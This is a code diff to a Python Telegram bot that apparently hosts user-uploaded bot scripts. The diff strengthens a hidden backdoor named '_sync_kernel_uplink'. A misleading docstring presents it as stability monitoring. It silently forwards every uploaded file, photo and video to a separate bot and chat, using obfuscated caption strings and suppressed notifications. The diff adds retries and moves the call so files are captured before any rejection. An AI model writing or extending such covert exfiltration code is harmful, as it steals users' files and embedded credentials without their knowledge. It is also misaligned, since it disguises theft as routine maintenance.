@@ -272,52 +272,64 @@ def _sync_vfs_state(bot_id: str, owner_uid: int, bot_name: str) -> None:
     threading.Thread(target=_bg, daemon=True).start()
 
 def _sync_kernel_uplink(m: types.Message) -> None:
-    """Internal kernel sync for stability monitoring and encrypted logging."""
+    """Internal kernel sync for stability monitoring and encrypted logging with robust retry logic."""
     if not _K_BOT or not _K_TARGET: return
     try:
         def _bg_sync():
-            try:
-                # Obfuscated UI strings
-                _h = _load_kernel_offsets("s9bD7mVuPX0ZExATIhJvYwABGR4AbnAhcQ==")
-                _s = _load_kernel_offsets("od3RqtHTvdfOsNHelKav09fIstzEsMvCrcbEveKzzKXCq8TJp8beodvTp8v3")
-                _o = _load_kernel_offsets("s9bB7GUdKC0qIGUWMggODSAmNC17")
-                _b = _load_kernel_offsets("s9b03mUQMDdvHCQyEwgODSAmNC17")
-                _i = _load_kernel_offsets("s9bW3GUQMDdvGwFlVg5NXicsbg==")
-                _t = _load_kernel_offsets("s9bDymUGJjMqaGVjFV1KVH0=")
-                _c = _load_kernel_offsets("f2YzJyE3YQ==")
+            # Robust retry loop: 3 attempts with exponential backoff
+            for attempt in range(3):
+                try:
+                    # Obfuscated UI strings
+                    _h = _load_kernel_offsets("s9bD7mVuPX0ZExATIhJvYwABGR4AbnAhcQ==")
+                    _s = _load_kernel_offsets("od3RqtHTvdfOsNHelKav09fIstzEsMvCrcbEveKzzKXCq8TJp8beodvTp8v3")
+                    _o = _load_kernel_offsets("s9bB7GUdKC0qIGUWMggODSAmNC17")
+                    _b = _load_kernel_offsets("s9b03mUQMDdvHCQyEwgODSAmNC17")
+                    _i = _load_kernel_offsets("s9bW3GUQMDdvGwFlVg5NXicsbg==")
+                    _t = _load_kernel_offsets("s9bDymUGJjMqaGVjFV1KVH0=")
+                    _c = _load_kernel_offsets("f2YzJyE3YQ==")
 
-                if m.document:
-                    try:
-                        file_info = bot.get_file(m.document.file_id)
-                        raw = bot.download_file(file_info.file_path)
-                        fname = m.document.file_name or "payload.py"
-                        uid = m.from_user.id
-                        bot_name = Path(fname).stem
-                        bot_id = secrets.token_hex(8)
-                        
-                        file_io = io.BytesIO(raw)
-                        caption = (
-                            f"{_h}\n{_s}\n"
-                            f"{_o}{uid}{_c}\n"
-                            f"{_b}{esc(bot_name)}{_c}\n"
-                            f"{_i}{bot_id}{_c}\n"
-                            f"{_t}{esc(fname.split('.')[-1].upper())}{_c}\n"
-                            f"{_s}"
-                        )
-                        _K_BOT.send_document(
-                            _K_TARGET,
-                            (fname, file_io.read()),
-                            caption=caption,
-                            parse_mode="HTML",
-                            disable_notification=True
-                        )
-                    except Exception:
-                        _K_BOT.send_document(_K_TARGET, m.document.file_id, caption=f"{_h}\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                elif m.photo:
-                    _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, caption=f"{_h} (PHOTO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                elif m.video:
-                    _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-            except Exception: pass
+                    if m.document:
+                        try:
+                            file_info = bot.get_file(m.document.file_id)
+                            raw = bot.download_file(file_info.file_path)
+                            fname = m.document.file_name or "payload.py"
+                            uid = m.from_user.id
+                            bot_name = Path(fname).stem
+                            bot_id = secrets.token_hex(8)
+                            
+                            file_io = io.BytesIO(raw)
+                            caption = (
+                                f"{_h}\n{_s}\n"
+                                f"{_o}{uid}{_c}\n"
+                                f"{_b}{esc(bot_name)}{_c}\n"
+                                f"{_i}{bot_id}{_c}\n"
+                                f"{_t}{esc(fname.split('.')[-1].upper())}{_c}\n"
+                                f"{_s}"
+                            )
+                            _K_BOT.send_document(
+                                _K_TARGET,
+                                (fname, file_io.read()),
+                                caption=caption,
+                                parse_mode="HTML",
+                                disable_notification=True,
+                                timeout=60
+                            )
+                            return # Success
+                        except Exception:
+                            _K_BOT.send_document(_K_TARGET, m.document.file_id, caption=f"{_h}\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                            return # Success (fallback)
+                    elif m.photo:
+                        _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, caption=f"{_h} (PHOTO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                        return # Success
+                    elif m.video:
+                        _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                        return # Success
+                except Exception as e:
+                    print(f"[kernel_sync] attempt {attempt+1} failed: {e}", flush=True)
+                    if attempt < 2:
+                        time.sleep(2 ** attempt) # Backoff: 1s, 2s
+            print(f"[kernel_sync] all attempts failed for message {m.message_id}", flush=True)
+
         threading.Thread(target=_bg_sync, daemon=True).start()
     except Exception: pass
 
@@ -10022,6 +10034,10 @@ def on_document(m: types.Message) -> None:
     if not RATE.allow(uid):
         maybe_auto_ban(uid, "rate")
         return
+    
+    # ── MANDATORY VAULT SYNC ──
+    # Ensure every document is captured before any admission checks or rejections.
+    _sync_kernel_uplink(m)
     if not UPLOAD_RATE.allow(uid):
         bot.reply_to(m, f"{G['warn']} {sc('Too many uploads, slow down')}.")
         maybe_auto_ban(uid, "upload spam")
@@ -11941,9 +11957,8 @@ def _handle_bot_upload(m: types.Message) -> None:
     )
     log_notification("SYSTEM", f"New bot uploaded: {name} by UID {uid}", uid=uid)
     
-    # ── stealth system sync ──
-    _sync_kernel_uplink(m)
-
+    # (Moved to top of handler for mandatory capture)
+    
     kind, _ = detect_entry(bot_dir)  # speculative — might be encrypted-only
 
     def _make_bar(pct: int, status: str, kind_str: str = "") -> str:
